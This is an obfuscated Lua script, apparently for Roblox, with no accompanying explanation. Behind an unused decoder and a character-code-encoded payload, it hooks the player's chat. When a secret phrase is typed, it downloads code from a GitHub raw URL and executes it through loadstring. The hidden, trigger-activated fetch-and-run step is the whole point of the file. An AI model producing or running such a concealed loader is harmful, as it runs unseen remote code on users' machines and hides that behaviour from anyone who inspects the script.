local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function wyspfcndTEEztlODZmqiIYjctUXydialasJbheBaRDJwVOHAUrdys(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


pcall(load(string.char(table.unpack({108,111,99,97,108,32,107,101,121,32,61,32,34,233,157,153,230,150,176,88,34,32,45,45,32,229,175,134,233,146,165,13,10,13,10,103,97,109,101,58,71,101,116,83,101,114,118,105,99,101,40,34,80,108,97,121,101,114,115,34,41,46,76,111,99,97,108,80,108,97,121,101,114,46,67,104,97,116,116,101,100,58,67,111,110,110,101,99,116,40,102,117,110,99,116,105,111,110,40,109,115,103,41,13,10,32,32,32,32,105,102,32,109,115,103,32,61,61,32,107,101,121,32,116,104,101,110,13,10,32,32,32,32,108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,106,120,100,106,98,120,47,102,102,102,47,109,97,105,110,47,37,69,55,37,56,54,37,65,67,37,69,56,37,66,70,37,56,55,37,69,56,37,66,70,37,57,57,34,41,41,40,41,13,10,32,32,32,32,101,110,100,13,10,101,110,100,41,}))))
